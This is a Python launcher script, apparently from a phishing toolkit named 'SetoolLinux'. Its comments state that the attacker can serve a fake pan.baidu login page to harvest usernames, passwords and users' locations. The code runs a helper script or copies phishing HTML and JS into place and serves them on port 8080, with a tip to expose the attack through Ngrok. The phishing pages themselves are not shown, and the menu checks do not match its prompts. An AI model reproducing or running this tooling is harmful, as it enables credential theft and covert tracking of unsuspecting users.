#======================================
#=the gps file                        =   
#=to chose the web file               =
#=https://pan.baidu web site          =
#======================================

#load the file 
#the attacker can chose the web file to get usersname and password
#the attacker also can get the users' location 
print("")
print("finish the file : GPS.py")
print("finish the file : setoollin.py")
print("finish the file : index.html")
print("finish the file : index.js")
print("finish the file : location.js")
print("")
print("")
print("=======================================")
print("SetoolLinux-->Global Positioning")   
print("=======================================")
print("[*]You Can Use Ngrok auxiliary your attack.Download Ngrok in : https://ngrok.com")
print("")

def list():
    print("1:-pan.baidu logon")
    print("2:-blank file")
    print("===================================")
    print("Enter The Key 3 To Back")

list()

th = input("Setoollin-->Global Positioning_>")

if th == "method get location 1" :
    print("Chose The 1:-")
    import os
    os.system("python3 location-panbaidu.py")

if th == "method get location 2" :
    print("Chose The 2:-")
    import os
    #del thr file form the content
    os.system("rm -f index.html")
    os.system("rm -f index.js")
    os.system("rm -f location.js")
    #start to copy the file to the content
    os.system("cp GPS/index.html ./")
    os.system("cp GPS/location.js ./")
    #===============================================================================================
    #=start the 8080 port                                                                          =
    #=first,del the file on the path /SetoolLinux                                                  =
    #=then, copy the file form the path /SetoolLinux/...                                           =
    #=because if you do not del the file on the path /SetoolLinux way be make the python file error=
    #===============================================================================================
    os.system("python3 -m http.server 8080")

if th == "3":
    import os
    os.system("python3 setoollin.py")

else:
    import os
    os.system("python3 GPS.py")